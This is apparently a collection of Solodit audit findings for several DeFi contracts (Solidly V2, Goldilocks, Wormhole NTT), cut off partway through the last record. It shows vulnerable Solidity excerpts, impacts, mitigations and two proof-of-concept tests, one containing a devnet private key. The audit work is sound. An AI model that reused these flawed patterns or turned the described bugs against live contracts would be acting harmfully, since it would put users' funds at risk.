
https://solodit.xyz/issues/locks-can-be-created-with-expiry-in-the-past-cyfrin-none-cyfrin-solidly-v2-memecore-v2-2-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [
        "it(\"lock can be created in the past\", async function () {\n  const { user1, test0, test1, router, pair } = await loadFixture(deploySolidlyV2Fixture);\n\n  let token0 = test0;\n  let token1 = test1;\n\n  // Approve tokens for liquidity provision\n  await token0.connect(user1).approve(router.address, ethers.constants.MaxUint256);\n  await token1.connect(user1).approve(router.address, ethers.constants.MaxUint256);\n\n  // Provide liquidity\n  await router.connect(user1).addLiquidity(\n    token0.address,\n    token1.address,\n    ethers.utils.parseUnits(\"100\", 18),\n    ethers.utils.parseUnits(\"100\", 18),\n    0,\n    0,\n    user1.address,\n    ethers.constants.MaxUint256\n  );\n\n  const liquidityBalance = await pair.balanceOf(user1.address);\n\n  let blockTimestamp = (await ethers.provider.getBlock('latest')).timestamp;\n\n  let maxUint128 = ethers.BigNumber.from(\"340282366920938463463374607431768211455\");\n\n  // Lock LP tokens\n  await pair.connect(user1).lockToken(user1.address, liquidityBalance, maxUint128.sub(blockTimestamp));\n\n\n  let ret = await pair.getLock(user1.address, 0);\n  expect(ret.date).to.be.eq(0);\n});\n"
    ],
    "Description": [
        " Due to a silent overflow in SolidityV2ERC42069::lockToken, a sufficiently large duration will cause the unlock date to be in the past. This could allow the caller to create a fraudulent lock, advertising that they have locked for the maximum duration but which can actually be withdrawn immediately. However, the impact is somewhat limited as this will be visible to anyone who calls SolidityV2ERC42069::getLock(s) with the owner's address (perhaps in a UI). From the attacker's perspective, the extension functionality could ideally be used to wrap around at will, hiding this malicious intent; however, this is not possible due to the checked math revert when incrementing the date."
    ],
    "Impact": [
        " This bug has a high likelihood of being abused with a more limited impact; therefore, it is categorized as a medium-severity finding."
    ],
    "Proof of Concept": [
        " Append this test to MultiTest.js:"
    ],
    "Recommended Mitigation": [
        " Cast the timestamp to uint128 prior to performing the addition rather than unsafely downcasting the result of the addition:"
    ],
    "Solidly Labs": [
        " Fixed in commit 14533e7."
    ],
    "Cyfrin": [
        " Verified. The timestamp is first cast to uint128 prior to performing the addition.",
        "\\clearpage"
    ]
}
----End JSON----

https://solodit.xyz/issues/goldilendlock-will-always-revert-cyfrin-none-cyfrin-goldilocks-v11-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [
        "  function lock(uint256 amount) external {\n    uint256 mintAmount = _GiBGTMintAmount(amount);\n    poolSize += amount;\n    _refreshiBGT(amount); //@audit should call after depositing funds\n    SafeTransferLib.safeTransferFrom(ibgt, msg.sender, address(this), amount);\n    _mint(msg.sender, mintAmount);\n    emit iBGTLock(msg.sender, amount);\n  }\n...\n  function _refreshiBGT(uint256 ibgtAmount) internal {\n    ERC20(ibgt).approve(ibgtVault, ibgtAmount);\n    iBGTVault(ibgtVault).stake(ibgtAmount); //@audit will revert here\n  }\n"
    ],
    "Severity": [
        " High"
    ],
    "Description": [
        " In lock(), it calls _refreshiBGT() before pulling iBGT from the user and will revert while calling iBGTVault(ibgtVault).stake()."
    ],
    "Impact": [
        " Users can't lock iBGT as lock() always reverts."
    ],
    "Recommended Mitigation": [
        " _refreshiBGT() should be called after pulling funds from the user."
    ],
    "Client": [
        " Fixed in PR #1"
    ],
    "Cyfrin": [
        " Verified."
    ]
}
----End JSON----

https://solodit.xyz/issues/wrong-poolsize-increment-in-goldilendrepay-cyfrin-none-cyfrin-goldilocks-v11-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [
        "  function repay(uint256 repayAmount, uint256 _userLoanId) external {\n    Loan memory userLoan = loans[msg.sender][_userLoanId];\n    if(userLoan.borrowedAmount < repayAmount) revert ExcessiveRepay();\n    if(block.timestamp > userLoan.endDate) revert LoanExpired();\n    uint256 interestLoanRatio = FixedPointMathLib.divWad(userLoan.interest, userLoan.borrowedAmount);\n    uint256 interest = FixedPointMathLib.mulWadUp(repayAmount, interestLoanRatio);\n    outstandingDebt -= repayAmount - interest > outstandingDebt ? outstandingDebt : repayAmount - interest;\n    loans[msg.sender][_userLoanId].borrowedAmount -= repayAmount;\n    loans[msg.sender][_userLoanId].interest -= interest;\n    poolSize += userLoan.interest * (1000 - (multisigShare + apdaoShare)) / 1000; //@audit should use interest instead of userLoan.interest\n...\n  }\n"
    ],
    "Severity": [
        " High"
    ],
    "Description": [
        " When a user repays his loan using repay(), it increases poolSize with the repaid interest. During the increment, it uses the wrong amount.",
        "It should use interest instead of userLoan.interest because the user repaid interest only."
    ],
    "Impact": [
        " poolSize would be tracked wrongly after calling repay() and several functions wouldn't work as expected."
    ],
    "Recommended Mitigation": [
        " poolSize should be updated using interest."
    ],
    "Client": [
        " Fixed in PR #2"
    ],
    "Cyfrin": [
        " Verified."
    ]
}
----End JSON----

https://solodit.xyz/issues/users-can-extend-an-expired-boost-using-invalidated-nfts-cyfrin-none-cyfrin-goldilocks-v11-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [
        "  function _buildBoost(\n    address[] calldata partnerNFTs,\n    uint256[] calldata partnerNFTIds\n  ) internal returns (Boost memory newUserBoost) {\n    uint256 magnitude;\n    Boost storage userBoost = boosts[msg.sender];\n    if(userBoost.expiry == 0) {\n...\n    }\n    else {\n      address[] storage nfts = userBoost.partnerNFTs;\n      uint256[] storage ids = userBoost.partnerNFTIds;\n      magnitude = userBoost.boostMagnitude; //@audit use old magnitude without checking\n      for (uint256 i = 0; i < partnerNFTs.length; i++) {\n        magnitude += partnerNFTBoosts[partnerNFTs[i]];\n        nfts.push(partnerNFTs[i]);\n        ids.push(partnerNFTIds[i]);\n      }\n      newUserBoost = Boost({\n        partnerNFTs: nfts,\n        partnerNFTIds: ids,\n        expiry: block.timestamp + boostLockDuration,\n        boostMagnitude: magnitude\n      });\n    }\n  }\n"
    ],
    "Severity": [
        " High"
    ],
    "Description": [
        " In Goldilend.sol#L251, a user can extend a boost with invalidated NFTs."
    ],
    "Impact": [
        " Malicious users can use invalidated NFTs to extend their boosts forever."
    ],
    "Recommended Mitigation": [
        " Whenever users extend their boosts, their NFTs should be evaluated again."
    ],
    "Client": [
        " Fixed in PR #3"
    ],
    "Cyfrin": [
        " Verified."
    ]
}
----End JSON----

https://solodit.xyz/issues/team-members-cant-unstake-the-initial-allocation-forever-cyfrin-none-cyfrin-goldilocks-v11-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [
        "  function _vestingCheck(address user, uint256 amount) internal view returns (uint256) {\n    if(teamAllocations[user] > 0) return 0; //@audit return 0 for team members\n    uint256 initialAllocation = seedAllocations[user];\n    if(initialAllocation > 0) {\n      if(block.timestamp < vestingStart) return 0;\n      uint256 vestPortion = FixedPointMathLib.divWad(block.timestamp - vestingStart, vestingEnd - vestingStart);\n      return FixedPointMathLib.mulWad(vestPortion, initialAllocation) - (initialAllocation - stakedLocks[user]);\n    }\n    else {\n      return amount;\n    }\n  }\n"
    ],
    "Severity": [
        " High"
    ],
    "Description": [
        " When users call unstake(), it calculates the vested amount using _vestingCheck().",
        "But it returns 0 for team members and they can't unstake forever.\nFurthermore, in stake(), it just prevents seed investors, not team members. So if team members have staked additionally, they can't unstake also."
    ],
    "Impact": [
        " Team members can't unstake forever."
    ],
    "Recommended Mitigation": [
        " _vestingCheck should use the same logic as initial investors for team mates."
    ],
    "Client": [
        " Acknowledged, it is intended that the team cannot unstake their tokens. PR #4 fixes issue of stake not preventing team members from staking."
    ],
    "Cyfrin": [
        " Verified."
    ]
}
----End JSON----

https://solodit.xyz/issues/in-govlocks-it-shouldnt-use-a-deposits-mapping-cyfrin-none-cyfrin-goldilocks-v11-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [
        "  function deposit(uint256 amount) external {\n    deposits[msg.sender] += amount; //@audit no need\n    _moveDelegates(address(0), delegates[msg.sender], amount);\n    SafeTransferLib.safeTransferFrom(locks, msg.sender, address(this), amount);\n    _mint(msg.sender, amount);\n  }\n\n  /// @notice Withdraws Locks to burn Govlocks\n  /// @param amount Amount of Locks to withdraw\n  function withdraw(uint256 amount) external {\n    deposits[msg.sender] -= amount; //@audit no need\n    _moveDelegates(delegates[msg.sender], address(0), amount);\n    _burn(msg.sender, amount);\n    SafeTransferLib.safeTransfer(locks, msg.sender, amount);\n  }\n"
    ],
    "Severity": [
        " High"
    ],
    "Description": [
        " In GovLocks, it tracks every user's deposit amount using a deposits mapping.\nAs users can transfer govLocks freely, they might have fewer deposits than their govLocks balance and wouldn't be able to withdraw when they want.",
        "Here is a possible scenario."
    ],
    "Impact": [
        " Users wouldn't be able to withdraw LOCKS with govLOCKS."
    ],
    "Recommended Mitigation": [
        " We don't need to use the deposits mapping at all and we can just rely on govLocks balances."
    ],
    "Client": [
        " Fixed in PR #8"
    ],
    "Cyfrin": [
        " Verified."
    ]
}
----End JSON----

https://solodit.xyz/issues/some-functions-of-goldilend-will-revert-forever-cyfrin-none-cyfrin-goldilocks-v11-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [
        "  function multisigInterestClaim() external {\n    if(msg.sender != multisig) revert NotMultisig();\n    uint256 interestClaim = multisigClaims;\n    multisigClaims = 0;\n    SafeTransferLib.safeTransfer(ibgt, multisig, interestClaim);\n  }\n\n  /// @inheritdoc IGoldilend\n  function apdaoInterestClaim() external {\n    if(msg.sender != apdao) revert NotAPDAO();\n    uint256 interestClaim = apdaoClaims;\n    apdaoClaims = 0;\n    SafeTransferLib.safeTransfer(ibgt, apdao, interestClaim);\n  }\n\n...\n\n  function sunsetProtocol() external {\n    if(msg.sender != timelock) revert NotTimelock();\n    SafeTransferLib.safeTransfer(ibgt, multisig, poolSize - outstandingDebt);\n  }\n"
    ],
    "Severity": [
        " High"
    ],
    "Description": [
        " Goldilend.multisigInterestClaim()/apdaoInterestClaim()/sunsetProtocol() will revert forever because they doesn't withdraw ibgt from ibgtVault before the transfer.",
        "As ibgtVault has all ibgt of Goldilend, they should withdraw from ibgtVault first."
    ],
    "Impact": [
        " Goldilend.multisigInterestClaim()/apdaoInterestClaim()/sunsetProtocol() will revert forever."
    ],
    "Recommended Mitigation": [
        " 3 functions should be changed like the below."
    ],
    "Client": [
        " Fixed in PR #9 and PR #12"
    ],
    "Cyfrin": [
        " Verified."
    ]
}
----End JSON----

https://solodit.xyz/issues/goldigovernor_getproposalstate-shouldnt-use-totalsupply-cyfrin-none-cyfrin-goldilocks-v11-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [
        "  function _getProposalState(uint256 proposalId) internal view returns (ProposalState) {\n    Proposal storage proposal = proposals[proposalId];\n    if (proposal.cancelled) return ProposalState.Canceled;\n    else if (block.number <= proposal.startBlock) return ProposalState.Pending;\n    else if (block.number <= proposal.endBlock) return ProposalState.Active;\n    else if (proposal.eta == 0) return ProposalState.Succeeded;\n    else if (proposal.executed) return ProposalState.Executed;\n    else if (proposal.forVotes <= proposal.againstVotes || proposal.forVotes < Goldiswap(goldiswap).totalSupply() / 20) { //@audit shouldn't use totalSupply\n      return ProposalState.Defeated;\n    }\n    else if (block.timestamp >= proposal.eta + Timelock(timelock).GRACE_PERIOD()) {\n      return ProposalState.Expired;\n    }\n    else {\n      return ProposalState.Queued;\n    }\n  }\n"
    ],
    "Severity": [
        " Medium"
    ],
    "Description": [
        " In _getProposalState(), it uses Goldiswap(goldiswap).totalSupply() during the comparison.",
        "As totalSupply is increasing in real time, a Queued proposal might be changed to Defeated one unexpectedly due to the increased supply."
    ],
    "Impact": [
        " A proposal state might be changed unexpectedly."
    ],
    "Recommended Mitigation": [
        " We should introduce another mechanism for the quorum check rather than using totalSupply."
    ],
    "Client": [
        " Fixed in PR #5"
    ],
    "Cyfrin": [
        " Verified."
    ]
}
----End JSON----

https://solodit.xyz/issues/in-goldivaultredeemyield-users-can-redeem-more-yield-tokens-using-reentrancy-cyfrin-none-cyfrin-goldilocks-v11-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [
        "  function redeemYield(uint256 amount) external {\n    if(amount == 0) revert InvalidRedemption();\n    if(block.timestamp < concludeTime + delay || !concluded) revert NotConcluded();\n    uint256 yieldShare = FixedPointMathLib.divWad(amount, ERC20(yt).totalSupply());\n    YieldToken(yt).burnYT(msg.sender, amount);\n    uint256 yieldTokensLength = yieldTokens.length;\n    for(uint8 i; i < yieldTokensLength; ++i) {\n      uint256 finalYield;\n      if(yieldTokens[i] == depositToken) {\n        finalYield = ERC20(yieldTokens[i]).balanceOf(address(this)) - depositTokenAmount;\n      }\n      else {\n        finalYield = ERC20(yieldTokens[i]).balanceOf(address(this));\n      }\n      uint256 claimable = FixedPointMathLib.mulWad(finalYield, yieldShare);\n      SafeTransferLib.safeTransfer(yieldTokens[i], msg.sender, claimable);\n    }\n    emit YieldTokenRedemption(msg.sender, amount);\n  }\n"
    ],
    "Severity": [
        " Medium"
    ],
    "Description": [
        " Possible reentrancy in Goldivault.redeemYield() if yieldToken has a beforeTokenTransfer hook."
    ],
    "Impact": [
        " Malicious users can steal yieldToken using redeemYield()."
    ],
    "Recommended Mitigation": [
        " We should add a nonReentrant modifier to redeemYield()."
    ],
    "Client": [
        " Fixed in PR #13"
    ],
    "Cyfrin": [
        " Verified."
    ]
}
----End JSON----

https://solodit.xyz/issues/wrong-validation-in-goldigovernorcancel-cyfrin-none-cyfrin-goldilocks-v11-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [
        "  function cancel(uint256 proposalId) external {\n    if(_getProposalState(proposalId) == ProposalState.Executed) revert InvalidProposalState();\n    Proposal storage proposal = proposals[proposalId];\n    if(msg.sender != proposal.proposer) revert NotProposer();\n    if(GovLocks(govlocks).getPriorVotes(proposal.proposer, block.number - 1) > proposalThreshold) revert AboveThreshold(); //@audit incorrect\n    proposal.cancelled = true;\n    uint256 targetsLength = proposal.targets.length;\n    for (uint256 i = 0; i < targetsLength; i++) {\n      Timelock(timelock).cancelTransaction(proposal.targets[i], proposal.eta, proposal.values[i], proposal.calldatas[i], proposal.signatures[i]);\n    }\n    emit ProposalCanceled(proposalId);\n  }\n"
    ],
    "Severity": [
        " Medium"
    ],
    "Description": [
        " In Goldigovernor.cancel(), the proposer should have fewer votes than proposalThreshold to cancel his proposal."
    ],
    "Impact": [
        " A proposer can't cancel his proposal unless he decreases his voting power."
    ],
    "Recommended Mitigation": [
        " It should be modified like this."
    ],
    "Client": [
        " Fixed in PR #7"
    ],
    "Cyfrin": [
        " Verified."
    ]
}
----End JSON----

https://solodit.xyz/issues/users-wouldnt-cancel-their-proposals-due-to-the-increased-proposalthreshold-cyfrin-none-cyfrin-goldilocks-v11-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [
        "  function setProposalThreshold(uint256 newProposalThreshold) external {\n    if(msg.sender != multisig) revert NotMultisig();\n    if(newProposalThreshold < MIN_PROPOSAL_THRESHOLD || newProposalThreshold > MAX_PROPOSAL_THRESHOLD) revert InvalidVotingParameter();\n    uint256 oldProposalThreshold = proposalThreshold;\n    proposalThreshold = newProposalThreshold;\n    emit ProposalThresholdSet(oldProposalThreshold, proposalThreshold);\n  }\n"
    ],
    "Severity": [
        " Medium"
    ],
    "Description": [
        " When users call cancel(), it validates the caller's voting power with proposalThreshold which can be changed using setProposalThreshold().",
        "Here is a possible scenario."
    ],
    "Impact": [
        " Users wouldn't cancel their proposals due to the increased proposalThreshold."
    ],
    "Recommended Mitigation": [
        " It would be good to cache proposalThreshold as a proposal state."
    ],
    "Client": [
        " Acknowledged, we will ensure to only change parameters while there are no pending proposals."
    ],
    "Cyfrin": [
        " Acknowledged."
    ]
}
----End JSON----

https://solodit.xyz/issues/goldilendliquidate-might-revert-due-to-underflow-cyfrin-none-cyfrin-goldilocks-v11-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [
        "  function repay(uint256 repayAmount, uint256 _userLoanId) external {\n      Loan memory userLoan = loans[msg.sender][_userLoanId];\n      if(userLoan.borrowedAmount < repayAmount) revert ExcessiveRepay();\n      if(block.timestamp > userLoan.endDate) revert LoanExpired();\n      uint256 interestLoanRatio = FixedPointMathLib.divWad(userLoan.interest, userLoan.borrowedAmount);\nL425  uint256 interest = FixedPointMathLib.mulWadUp(repayAmount, interestLoanRatio); //@audit rounding issue\n      outstandingDebt -= repayAmount - interest > outstandingDebt ? outstandingDebt : repayAmount - interest;\n      ...\n  }\n...\n  function liquidate(address user, uint256 _userLoanId) external {\n      Loan memory userLoan = loans[msg.sender][_userLoanId];\n      if(block.timestamp < userLoan.endDate || userLoan.liquidated || userLoan.borrowedAmount == 0) revert Unliquidatable();\n      loans[user][_userLoanId].liquidated = true;\n      loans[user][_userLoanId].borrowedAmount = 0;\nL448  outstandingDebt -= userLoan.borrowedAmount - userLoan.interest;\n      ...\n  }\n"
    ],
    "Severity": [
        " Medium"
    ],
    "Description": [
        " In repay(), there would be a rounding during the interest calculation.",
        "Here is a possible scenario."
    ],
    "Impact": [
        " liquidate() might revert due to underflow."
    ],
    "Recommended Mitigation": [
        " In liquidate(), outstandingDebt should be updated like the below."
    ],
    "Client": [
        " Fixed in PR #10"
    ],
    "Cyfrin": [
        " Verified."
    ]
}
----End JSON----

https://solodit.xyz/issues/in-goldigovernor-wrong-assumption-of-block-time-cyfrin-none-cyfrin-goldilocks-v11-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [
        "  /// @notice Minimum voting period\n  uint32 public constant MIN_VOTING_PERIOD = 5760; // About 24 hours\n\n  /// @notice Maximum voting period\n  uint32 public constant MAX_VOTING_PERIOD = 80640; // About 2 weeks\n\n  /// @notice Minimum voting delay\n  uint32 public constant MIN_VOTING_DELAY = 1;\n\n  /// @notice Maximum voting delay\n  uint32 public constant MAX_VOTING_DELAY = 40320; // About 1 week\n",
        "Berachain has the following properties:\n\n- Block time: 5s\n"
    ],
    "Severity": [
        " Medium"
    ],
    "Description": [
        " In Goldigovernor.sol, voting period/delay limits are set with 15s block time.",
        "But Berachain has 5s block time according to its documentation.",
        "So these limits will be set shorter than expected."
    ],
    "Impact": [
        " Voting period/delay limits will be set shorter than expected."
    ],
    "Recommended Mitigation": [
        " We should calculate these limits with 5s block time."
    ],
    "Client": [
        " Fixed in PR #14"
    ],
    "Cyfrin": [
        " Verified."
    ]
}
----End JSON----

https://solodit.xyz/issues/queued-transfers-can-become-stuck-on-the-source-chain-if-transceiver-instructions-are-encoded-in-the-incorrect-order-cyfrin-none-cyfrin-wormhole-evm-ntt-v2-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [
        "/* snip */\nfor (uint256 i = 0; i < instructionsLength; i++) {\n    TransceiverInstruction memory instruction;\n    (instruction, offset) = parseTransceiverInstructionUnchecked(encoded, offset);\n\n    uint8 instructionIndex = instruction.index;\n\n    // The instructions passed in have to be strictly increasing in terms of transceiver index\n    if (i != 0 && instructionIndex <= lastIndex) {\n        revert UnorderedInstructions();\n    }\n    lastIndex = instructionIndex;\n\n    instructions[instructionIndex] = instruction;\n}\n/* snip */\n",
        "contract TestWrongTransceiverOrder is Test, INttManagerEvents, IRateLimiterEvents {\n    NttManager nttManagerChain1;\n    NttManager nttManagerChain2;\n\n    using TrimmedAmountLib for uint256;\n    using TrimmedAmountLib for TrimmedAmount;\n\n    uint16 constant chainId1 = 7;\n    uint16 constant chainId2 = 100;\n    uint8 constant FAST_CONSISTENCY_LEVEL = 200;\n    uint256 constant GAS_LIMIT = 500000;\n\n    uint16 constant SENDING_CHAIN_ID = 1;\n    uint256 constant DEVNET_GUARDIAN_PK =\n        0xcfb12303a19cde580bb4dd771639b0d26bc68353645571a8cff516ab2ee113a0;\n    WormholeSimulator guardian;\n    uint256 initialBlockTimestamp;\n\n    WormholeTransceiver wormholeTransceiverChain1;\n    WormholeTransceiver wormholeTransceiver2Chain1;\n\n    WormholeTransceiver wormholeTransceiverChain2;\n    address userA = address(0x123);\n    address userB = address(0x456);\n    address userC = address(0x789);\n    address userD = address(0xABC);\n\n    address relayer = address(0x28D8F1Be96f97C1387e94A53e00eCcFb4E75175a);\n    IWormhole wormhole = IWormhole(0x706abc4E45D419950511e474C7B9Ed348A4a716c);\n\n    function setUp() public {\n        string memory url = \"https://goerli.blockpi.network/v1/rpc/public\";\n        vm.createSelectFork(url);\n        initialBlockTimestamp = vm.getBlockTimestamp();\n\n        guardian = new WormholeSimulator(address(wormhole), DEVNET_GUARDIAN_PK);\n\n        vm.chainId(chainId1);\n        DummyToken t1 = new DummyToken();\n        NttManager implementation =\n            new MockNttManagerContract(address(t1), INttManager.Mode.LOCKING, chainId1, 1 days);\n\n        nttManagerChain1 =\n            MockNttManagerContract(address(new ERC1967Proxy(address(implementation), \"\")));\n        nttManagerChain1.initialize();\n\n        WormholeTransceiver wormholeTransceiverChain1Implementation = new MockWormholeTransceiverContract(\n            address(nttManagerChain1),\n            address(wormhole),\n            address(relayer),\n            address(0x0),\n            FAST_CONSISTENCY_LEVEL,\n            GAS_LIMIT\n        );\n        wormholeTransceiverChain1 = MockWormholeTransceiverContract(\n            address(new ERC1967Proxy(address(wormholeTransceiverChain1Implementation), \"\"))\n        );\n\n        WormholeTransceiver wormholeTransceiverChain1Implementation2 = new MockWormholeTransceiverContract(\n            address(nttManagerChain1),\n            address(wormhole),\n            address(relayer),\n            address(0x0),\n            FAST_CONSISTENCY_LEVEL,\n            GAS_LIMIT\n        );\n        wormholeTransceiver2Chain1 = MockWormholeTransceiverContract(\n            address(new ERC1967Proxy(address(wormholeTransceiverChain1Implementation2), \"\"))\n        );\n\n\n        // Actually initialize properly now\n        wormholeTransceiverChain1.initialize();\n        wormholeTransceiver2Chain1.initialize();\n\n\n        nttManagerChain1.setTransceiver(address(wormholeTransceiverChain1));\n        nttManagerChain1.setTransceiver(address(wormholeTransceiver2Chain1));\n        nttManagerChain1.setOutboundLimit(type(uint64).max);\n        nttManagerChain1.setInboundLimit(type(uint64).max, chainId2);\n\n        // Chain 2 setup\n        vm.chainId(chainId2);\n        DummyToken t2 = new DummyTokenMintAndBurn();\n        NttManager implementationChain2 =\n            new MockNttManagerContract(address(t2), INttManager.Mode.BURNING, chainId2, 1 days);\n\n        nttManagerChain2 =\n            MockNttManagerContract(address(new ERC1967Proxy(address(implementationChain2), \"\")));\n        nttManagerChain2.initialize();\n\n        WormholeTransceiver wormholeTransceiverChain2Implementation = new MockWormholeTransceiverContract(\n            address(nttManagerChain2),\n            address(wormhole),\n            address(relayer),\n            address(0x0),\n            FAST_CONSISTENCY_LEVEL,\n            GAS_LIMIT\n        );\n\n        wormholeTransceiverChain2 = MockWormholeTransceiverContract(\n            address(new ERC1967Proxy(address(wormholeTransceiverChain2Implementation), \"\"))\n        );\n        wormholeTransceiverChain2.initialize();\n\n        nttManagerChain2.setTransceiver(address(wormholeTransceiverChain2));\n        nttManagerChain2.setOutboundLimit(type(uint64).max);\n        nttManagerChain2.setInboundLimit(type(uint64).max, chainId1);\n\n        // Register peer contracts for the nttManager and transceiver. Transceivers and nttManager each have the concept of peers here.\n        nttManagerChain1.setPeer(chainId2, bytes32(uint256(uint160(address(nttManagerChain2)))), 9);\n        nttManagerChain2.setPeer(chainId1, bytes32(uint256(uint160(address(nttManagerChain1)))), 7);\n\n        // Set peers for the transceivers\n        wormholeTransceiverChain1.setWormholePeer(\n            chainId2, bytes32(uint256(uint160(address(wormholeTransceiverChain2))))\n        );\n\n       wormholeTransceiver2Chain1.setWormholePeer(\n            chainId2, bytes32(uint256(uint160(address(wormholeTransceiverChain2))))\n        );\n\n        wormholeTransceiverChain2.setWormholePeer(\n            chainId1, bytes32(uint256(uint160(address(wormholeTransceiverChain1))))\n        );\n\n        require(nttManagerChain1.getThreshold() != 0, \"Threshold is zero with active transceivers\");\n\n        // Actually set it\n        nttManagerChain1.setThreshold(2);\n        nttManagerChain2.setThreshold(1);\n    }\n\n    function testWrongTransceiverOrder() external {\n        vm.chainId(chainId1);\n\n        // Setting up the transfer\n        DummyToken token1 = DummyToken(nttManagerChain1.token());\n        uint8 decimals = token1.decimals();\n\n        token1.mintDummy(address(userA), 5 * 10 ** decimals);\n        uint256 outboundLimit = 4 * 10 ** decimals;\n        nttManagerChain1.setOutboundLimit(outboundLimit);\n\n        vm.startPrank(userA);\n\n        uint256 transferAmount = 5 * 10 ** decimals;\n        token1.approve(address(nttManagerChain1), transferAmount);\n\n        // transfer with shouldQueue == true\n        uint64 qSeq = nttManagerChain1.transfer(\n            transferAmount, chainId2, toWormholeFormat(userB), true, encodeTransceiverInstructionsJumbled(true)\n        );\n\n        assertEq(qSeq, 0);\n        IRateLimiter.OutboundQueuedTransfer memory qt = nttManagerChain1.getOutboundQueuedTransfer(0);\n        assertEq(qt.amount.getAmount(), transferAmount.trim(decimals, decimals).getAmount());\n        assertEq(qt.recipientChain, chainId2);\n        assertEq(qt.recipient, toWormholeFormat(userB));\n        assertEq(qt.txTimestamp, initialBlockTimestamp);\n\n        // assert that the contract also locked funds from the user\n        assertEq(token1.balanceOf(address(userA)), 0);\n        assertEq(token1.balanceOf(address(nttManagerChain1)), transferAmount);\n\n         // elapse rate limit duration - 1\n        uint256 durationElapsedTime = initialBlockTimestamp + nttManagerChain1.rateLimitDuration();\n\n        vm.warp(durationElapsedTime);\n\n        vm.expectRevert(0x71f23ef2); //UnorderedInstructions() selector\n        nttManagerChain1.completeOutboundQueuedTransfer(0);\n    }\n\n    // Encode an instruction for each of the relayers\n    function encodeTransceiverInstructionsJumbled(bool relayer_off) public view returns (bytes memory) {\n        WormholeTransceiver.WormholeTransceiverInstruction memory instruction =\n            IWormholeTransceiver.WormholeTransceiverInstruction(relayer_off);\n\n        bytes memory encodedInstructionWormhole =\n            wormholeTransceiverChain1.encodeWormholeTransceiverInstruction(instruction);\n\n        TransceiverStructs.TransceiverInstruction memory TransceiverInstruction1 =\n        TransceiverStructs.TransceiverInstruction({index: 0, payload: encodedInstructionWormhole});\n        TransceiverStructs.TransceiverInstruction memory TransceiverInstruction2 =\n        TransceiverStructs.TransceiverInstruction({index: 1, payload: encodedInstructionWormhole});\n\n        TransceiverStructs.TransceiverInstruction[] memory TransceiverInstructions =\n            new TransceiverStructs.TransceiverInstruction[](2);\n\n        TransceiverInstructions[0] = TransceiverInstruction2;\n        TransceiverInstructions[1] = TransceiverInstruction1;\n\n        return TransceiverStructs.encodeTransceiverInstructions(TransceiverInstructions);\n    }\n}\n"
    ],
    "Description": [
        " In the case of multiple Transceivers, the current logic expects that a sender encodes Transceiver instructions in order of increasing Transceiver registration index, as validated in TransceiverStructs::parseTransceiverInstructions. Under normal circumstances, this logic works as expected, and the transaction fails when the user packs transceiver instructions in the incorrect order.",
        "However, this requirement on the order of Transceiver indices is not checked when transfers are initially queued for delayed execution. As a result, a transaction where this is the case will fail when the user calls NttManager::completeOutboundQueuedTransfer to execute a queued transfer."
    ],
    "Impact": [
        " The sender's funds are transferred to the NTT Manager when messages are queued. However, this queued message can never be executed if the Transceiver indices are incorrectly ordered and, as a result, the user funds remain stuck in the NTT Manager."
    ],
    "Proof of Concept": [
        " Run the following test:"
    ],
    "Recommended Mitigation": [
        " When the transfer amount exceeds the current outbound capacity, verify the Transceiver instructions are ordered correctly before adding a message to the list of queued transfers."
    ],
    "Wormhole Foundation": [
        " Fixed in PR #368. With the cancel logic addition, we elected not to pre-validate in order to save gas."
    ],
    "Cyfrin": [
        " Verified. Cancellation of queued transfers appears to have been implemented correctly; however, validation of the Transceiver instructions remains deferred to the completion step."
    ]
}
----End JSON----

https://solodit.xyz/issues/queued-transfers-can-become-stuck-on-the-source-chain-if-new-transceivers-are-added-or-existing-transceivers-are-modified-before-completion-cyfrin-none-cyfrin-wormhole-evm-ntt-v2-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [
        "/* snip */\n// now check rate limits\nbool isAmountRateLimited = _isOutboundAmountRateLimited(internalAmount);\nif (!shouldQueue && isAmountRateLimited) {\n    revert NotEnoughCapacity(getCurrentOutboundCapacity(), amount);\n}\nif (shouldQueue && isAmountRateLimited) {\n    // emit an event to notify the user that the transfer is rate limited\n    emit OutboundTransferRateLimited(\n        msg.sender, sequence, amount, getCurrentOutboundCapacity()\n    );\n\n    // queue up and return\n    _enqueueOutboundTransfer(\n        sequence,\n        trimmedAmount,\n        recipientChain,\n        recipient,\n        msg.sender,\n        transceiverInstructions\n    );\n\n    // refund price quote back to sender\n    _refundToSender(msg.value);\n\n    // return the sequence in the queue\n    return sequence;\n}\n/* snip */\n",
        "function parseTransceiverInstructions(\n    bytes memory encoded,\n    uint256 numEnabledTransceivers\n) public pure returns (TransceiverInstruction[] memory) {\n    uint256 offset = 0;\n    uint256 instructionsLength;\n    (instructionsLength, offset) = encoded.asUint8Unchecked(offset);\n\n    // We allocate an array with the length of the number of enabled transceivers\n    // This gives us the flexibility to not have to pass instructions for transceivers that\n    // don't need them\n    TransceiverInstruction[] memory instructions =\n        new TransceiverInstruction[](numEnabledTransceivers);\n\n    uint256 lastIndex = 0;\n    for (uint256 i = 0; i < instructionsLength; i++) {\n        TransceiverInstruction memory instruction;\n        (instruction, offset) = parseTransceiverInstructionUnchecked(encoded, offset);\n\n        uint8 instructionIndex = instruction.index;\n\n        // The instructions passed in have to be strictly increasing in terms of transceiver index\n        if (i != 0 && instructionIndex <= lastIndex) {\n            revert UnorderedInstructions();\n        }\n        lastIndex = instructionIndex;\n\n        instructions[instructionIndex] = instruction;\n    }\n\n    encoded.checkLength(offset);\n\n    return instructions;\n}\n",
